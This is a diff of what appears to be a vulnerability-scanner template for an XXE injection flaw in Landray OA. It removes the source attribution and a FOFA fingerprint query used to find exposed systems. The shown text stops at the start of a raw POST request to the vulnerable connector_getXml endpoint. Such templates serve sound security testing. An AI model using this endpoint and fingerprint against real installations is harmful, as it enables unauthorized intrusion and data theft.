@@ -3,12 +3,8 @@ info:
   name: 蓝凌OA connector_getXml存在XXE注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zn153dusr7eewnyl'
+  description: ''
   tags: xxe,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: zn153dusr7eewnyl
-    fofa: title="欢迎登录智慧协同平台" || body="/Scripts/jquery.landray.dialog.js"
 http:
 - raw:
   - 'POST /AddressBook/connector_getdata.aspx/connector_getXml?type=add HTTP/1.1
